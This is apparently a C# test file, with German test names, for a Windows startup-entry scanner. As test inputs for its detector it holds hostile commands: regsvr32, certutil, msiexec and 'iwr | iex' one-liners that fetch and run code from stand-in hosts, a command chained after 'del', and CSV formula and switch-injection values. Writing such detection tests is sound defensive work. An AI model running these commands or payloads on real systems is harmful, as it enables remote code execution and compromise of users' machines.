using Trendo.Core;
using Trendo.Core.Sys;
using Xunit;

namespace Trendo.Core.Tests;

/// <summary>T-0755 Korrektur nach der Gegenprüfung (HOCH 1, MITTEL 2 und 4, NIEDRIG 5–7). Rot auf dem Stand 8fe0c0a79, grün danach.</summary>
public class T0755_Gegenpruefung
{
    static readonly string Sys = Environment.SystemDirectory;
    static StartEntry Run(string cmd, string? file = null) => new(SystemScan.KindRun, "Test", "HKCU", cmd, file ?? SystemScan.FileFromCommand(cmd));
    static readonly SignatureInfo Ms = new(SigState.Gueltig, "Microsoft Corporation", "Gültig signiert.");

    [Fact(DisplayName = "T-0755 Gegenprüfung HOCH: Windows-Werkzeuge und Interpreter mit Netz-Adresse, verdächtigem Ziel oder beliebigem Skript sind nie grün")]
    public void Lolbins_never_green()
    {
        if (!OperatingSystem.IsWindows()) return;
        var k32 = Path.Combine(Sys, "kernel32.dll");
        Finding A(string cmd, string? file = null) => SystemScan.Assess(Run(cmd, file), Ms);
        var regsvr = A(@"regsvr32 /s /n /u /i:http://example.invalid/x.sct scrobj.dll");
        Assert.Equal(Ampel.Rot, regsvr.Light); Assert.Equal("Lädt aus dem Netz", regsvr.Reason); Assert.Contains("Internet", regsvr.Explanation);
        Assert.Equal(Ampel.Rot, A(@"msiexec /q /i http://example.invalid/a.msi").Light);
        Assert.Equal(Ampel.Rot, A(@"certutil -urlcache -f http://example.invalid/a.exe C:\Windows\Temp\a.exe").Light);
        Assert.Equal(Ampel.Rot, A(@"msiexec /q /i \\fremder-rechner\freigabe\a.msi").Light);
        var forfiles = A(@"forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe");
        Assert.Equal(Ampel.Gelb, forfiles.Light); Assert.Contains("startet andere Programme", forfiles.Explanation);
        var shell = A(@"rundll32 shell32.dll,ShellExec_RunDLL C:\Users\Public\x.exe");
        Assert.Equal(Ampel.Rot, shell.Light); Assert.Equal("Verdächtiges Ziel", shell.Reason); Assert.Contains("x.exe", shell.Explanation);
        var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var py = A($"\"C:\\Programme\\Python\\python.exe\" \"{Path.Combine(home, "AppData", "Roaming", "x", "start.py")}\"", k32);
        Assert.Equal(Ampel.Rot, py.Light); Assert.Contains("Benutzerordner", py.Explanation);
        var node = A(@"""C:\Program Files\nodejs\node.exe"" C:\Werkzeuge\dienst.js", k32);
        Assert.Equal(Ampel.Gelb, node.Light); Assert.Equal("Startet ein Skript", node.Reason); Assert.Contains(@"C:\Werkzeuge\dienst.js", node.Explanation);
        Assert.Equal(Ampel.Gelb, A(@"""C:\Program Files\Java\bin\javaw.exe"" -jar ""C:\Program Files\App\app.jar""", k32).Light);
        Assert.Equal(Ampel.Gelb, A(@"pythonw C:\Werkzeuge\x.pyw", k32).Light);
        Assert.Equal(Ampel.Rot, A(@"powershell -w hidden -c iwr https://example.invalid/a.ps1 | iex").Light);
        Assert.Equal(Ampel.Gelb, A(@"schtasks /run /tn Test").Light);
        Assert.Equal(Ampel.Gelb, A(@"explorer.exe C:\Werkzeuge").Light);
        Assert.Equal(Ampel.Gruen, SystemScan.Assess(Run(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe")), Ms).Light); // Explorer ohne Argument bleibt grün
        // Aufräum-Befehl (nur löschen) und relativer Skriptname ohne bekannten Ordner: gelb, nicht rot (Fehlalarme aus dem Echtlauf)
        Assert.Equal(Ampel.Gelb, A($"C:\\WINDOWS\\system32\\cmd.exe /q /c del /q \"{Path.Combine(home, "AppData", "Local", "Beispiel", "Setup.exe")}\"").Light);
        Assert.Equal(Ampel.Rot, A($"cmd.exe /c del x & \"{Path.Combine(home, "AppData", "x.exe")}\"").Light);
        Assert.Equal(Ampel.Gelb, A(@"""C:\Program Files\nodejs\node.exe"" ""holen.mjs""", k32).Light);
        Assert.Contains(@"C:\Users\Public\x.exe", SystemScan.ArgTargets(@"shell32.dll,ShellExec_RunDLL C:\Users\Public\x.exe"));
    }

    [Fact(DisplayName = "T-0755 Gegenprüfung NIEDRIG: bekannte Herausgeber nur mit genauem Firmennamen aus der Signatur; Angaben aus Registrierung/Aufgabe machen nie grün")]
    public void Known_publishers_exact()
    {
        Assert.True(SystemScan.KnownPublisher("Microsoft Corporation")); Assert.True(SystemScan.KnownPublisher("intel corporation")); Assert.True(SystemScan.KnownPublisher("Dell Inc."));
        foreach (var bad in new[] { "Not Microsoft Ltd", "Apple Tree Software", "Zoom Media", "Microsoft Corporation Fake GmbH", "Intelligent Software Ltd" }) Assert.False(SystemScan.KnownPublisher(bad), bad);
        var k32 = Path.Combine(Sys, "kernel32.dll");
        var e = new StartEntry(SystemScan.KindProgram, "Test", "HKLM", k32, k32, DeclaredPublisher: "Microsoft Corporation");
        Assert.NotEqual(Ampel.Gruen, SystemScan.Assess(e, new(SigState.Gueltig, null, "Gültig, Signer unbekannt")).Light);
        Assert.NotEqual(Ampel.Gruen, SystemScan.Assess(e, new(SigState.Unsigniert, null, "")).Light);
    }

    [Fact(DisplayName = "T-0755 Gegenprüfung MITTEL: Bericht-CSV schützt vor Formeln (= + - @ Tab CR bekommen ein ')")]
    public void Csv_formula_safe()
    {
        var f = SystemScan.Assess(new StartEntry(SystemScan.KindProgram, "=HYPERLINK(\"http://x\")", "@SUM(1)", "+cmd", null, "-Firma"), new(SigState.NichtPruefbar, null, "\tx"));
        var csv = SystemScan.ReportCsv(new SystemScan.Result(DateTimeOffset.Now, [f], 0));
        Assert.Contains("\"'=HYPERLINK(\"\"http://x\"\")\"", csv); Assert.Contains("\"'@SUM(1)\"", csv); Assert.Contains("\"'+cmd\"", csv); Assert.Contains("\"'-Firma\"", csv);
        Assert.DoesNotContain(";\"=", csv); Assert.DoesNotContain(";\"@", csv); Assert.DoesNotContain(";\"+", csv);
    }

    [Fact(DisplayName = "T-0755 Gegenprüfung NIEDRIG: Paket-ID muss mit Buchstabe oder Ziffer beginnen („--override“ abgelehnt)")]
    public void SafeId_no_switch()
    {
        Assert.False(PackageParsers.SafeId("--override")); Assert.False(PackageParsers.SafeId("-x")); Assert.True(PackageParsers.SafeId("7zip.7zip")); Assert.True(PackageParsers.SafeId("Git.Git"));
    }

    [Fact(DisplayName = "T-0755 Gegenprüfung MITTEL (ERSETZT: Testprogramm statt winget): Aktualisieren ist nur bestätigt, wenn danach die neue Version dasteht; kaputte Quelle bei der Nachprüfung = nicht bestätigt")]
    public async Task Verify_upgrade_and_broken_list()
    {
        if (!OperatingSystem.IsWindows()) return;
        using var f = new Fixture();
        var dir = Path.Combine(f.Root, "ersatz"); var exe = FakeWinget.Create(dir);
        var c = new AppCenter(new WingetBackend(new RealProcessRunner(), exe), f.Core.Approvals, f.Core.Audit);
        var logs = Path.Combine(f.Root, "protokolle");
        File.WriteAllText(Path.Combine(dir, "installiert-Git.Git.txt"), "ok");
        var git = new PackageInfo("Git", "Git.Git", "2.45", "2.47");
        // (a) winget meldet Fehler, die alte Version steht noch da → nicht bestätigt
        var u = c.Plan("upgrade", git); f.Core.Approvals.Approve(u.Id, Principal.LocalOwner);
        var ur = await c.RunAsync(u, Principal.LocalOwner, logs, expectVersion: git.Available);
        Assert.False(ur.ExitOk); Assert.True(ur.Installed); Assert.Equal("2.45", ur.VersionAfter); Assert.False(ur.Verified);
        var log = File.ReadAllText(ur.LogFile);
        Assert.Contains("Version danach: 2.45 · erwartet: 2.47", log); Assert.Contains("Ziel erreicht: nein", log);
        // ohne bekannte Zielversion: nie bestätigt
        var u0 = c.Plan("upgrade", git); f.Core.Approvals.Approve(u0.Id, Principal.LocalOwner);
        Assert.False((await c.RunAsync(u0, Principal.LocalOwner, logs)).Verified);
        // erfolgreiche Aktualisierung → neue Version → bestätigt
        File.WriteAllText(Path.Combine(dir, "upgrade-geht.txt"), "ja");
        var u2 = c.Plan("upgrade", git); f.Core.Approvals.Approve(u2.Id, Principal.LocalOwner);
        var ok = await c.RunAsync(u2, Principal.LocalOwner, logs, expectVersion: "2.47");
        Assert.True(ok.ExitOk); Assert.Equal("2.47", ok.VersionAfter); Assert.True(ok.Verified);
        // (b) Entfernen klappt, aber „winget list“ scheitert an der Quelle → nicht prüfbar, nicht „entfernt“
        File.WriteAllText(Path.Combine(dir, "quelle-kaputt.txt"), "ja");
        var x = c.Plan("uninstall", git); f.Core.Approvals.Approve(x.Id, Principal.LocalOwner);
        var xr = await c.RunAsync(x, Principal.LocalOwner, logs);
        Assert.True(xr.ExitOk); Assert.Null(xr.Installed); Assert.False(xr.Verified);
        Assert.Contains("Nachprüfung: nicht prüfbar", File.ReadAllText(xr.LogFile));
        Assert.Null(await c.Backend.IsInstalledAsync("Git.Git"));
        File.Delete(Path.Combine(dir, "quelle-kaputt.txt"));
        Assert.False(await c.Backend.IsInstalledAsync("Git.Git")); // 0x8A150014 = wirklich nicht da
    }

    [Fact(DisplayName = "T-0755 Gegenprüfung NIEDRIG: Prüfsumme des fertigen Downloads wird im Hintergrund einmal berechnet und für den Vergleich wiederverwendet")]
    public async Task Download_hash_off_thread()
    {
        var root = Path.Combine(Path.GetTempPath(), "trendo-t0755-dlh-" + Guid.NewGuid().ToString("N")); var dir = Path.Combine(root, "dl"); Directory.CreateDirectory(dir);
        try
        {
            var q = new DownloadQueue(root);
            var j = q.Add(new Uri("https://example.org/a.txt"), dir, "753692EC36ADB4C794C973945EB2A99C1649703EA6F76BF259ABB4FB838E013E"); q.Started(j);
            File.WriteAllText(j.Target, "Hallo");
            await q.CompletedAsync(j);
            Assert.Equal(DownloadQueue.State.Fertig, j.Status); Assert.Equal("SHA-256 stimmt", j.HashResult);
            Assert.Equal("753692ec36adb4c794c973945eb2a99c1649703ea6f76bf259abb4fb838e013e", j.Sha256);
        }
        finally { Directory.Delete(root, true); }
    }
}
